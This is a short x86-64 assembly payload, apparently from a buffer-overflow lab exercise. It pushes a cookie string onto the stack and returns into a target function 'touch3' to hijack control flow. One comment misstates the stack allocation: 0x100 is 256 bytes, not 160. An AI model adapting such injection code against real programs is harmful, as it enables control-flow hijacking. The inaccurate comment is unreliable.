subq $0x100, %rsp					# allocate 160 bytes on the stack
push $0x0									# push string end 0 to the stack
mov $0x6166373939623935, %rax
push %rax									# push string
movq %rsp, %rdi						# string address as 1st arg to touch3
addq $0x110, %rsp					# restore stack pointer
push $0x4018fa						# push the touch3 addr to stacki
ret												# set pc to touch3 addr
